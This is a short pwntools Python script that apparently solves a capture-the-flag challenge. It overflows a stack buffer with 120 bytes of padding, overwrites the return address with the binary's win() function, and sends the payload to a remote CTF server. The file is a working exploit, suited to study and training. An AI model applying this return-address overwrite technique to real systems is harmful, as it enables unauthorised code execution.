from pwn import *

# Set up the binary
binary = "./main"
elf = ELF(binary)

# Offsets and addresses
offset = 120  # Replace with the correct offset from cyclic_find
win_addr = elf.symbols['win']  # Address of win()

# Payload
payload = b"A" * offset  # Padding to overflow buffer
payload += p64(win_addr)  # Overwrite return address with win()

# Send the payload
# io = process(binary)
io = remote('ctf.csd.lol', 4003)
io.sendline(payload)
res = io.recv(4096).decode()
print(res)
